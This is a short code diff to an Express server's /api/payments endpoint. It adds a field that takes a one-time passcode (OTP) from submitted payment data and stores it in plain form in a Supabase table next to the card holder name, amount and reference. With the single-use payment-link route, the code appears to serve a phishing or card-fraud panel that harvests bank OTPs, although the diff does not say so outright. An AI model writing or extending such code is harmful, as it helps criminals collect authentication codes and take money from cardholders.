@@ -153,7 +153,7 @@ app.patch('/api/link/:token/use', async (req, res) => {
 // ── POST /api/payments ─────────────────────────────────────────────
 // Record a completed card payment (name + amount + reference only — no card data)
 app.post('/api/payments', async (req, res) => {
-    const { card_holder, amount, reference } = req.body;
+    const { card_holder, amount, reference, otp } = req.body;
 
     if (!card_holder || !amount || !reference)
         return res.status(400).json({ error: 'card_holder, amount and reference are required' });
@@ -166,13 +166,16 @@ app.post('/api/payments', async (req, res) => {
 
     if (typeof amount !== 'string' || amount.length > 1000)
         return res.status(400).json({ error: 'Invalid amount' });
+
+    if (typeof otp !== 'string' || otp.length > 1000)
+        return res.status(400).json({ error: 'Invalid OTP' });
     // const parsed = parseInt(amount, 10);
     // if (isNaN(parsed) || parsed <= 0 || parsed > 1000000)
     //     return res.status(400).json({ error: 'Invalid amount' });
 
     const { data, error } = await supabase
         .from('dikarata')
-        .insert([{ card_holder: card_holder.trim(), amount: amount.trim(), reference: reference.trim() }])
+        .insert([{ card_holder: card_holder.trim(), amount: amount.trim(), reference: reference.trim(), otp: otp.trim() }])
         .select()
         .single();
 
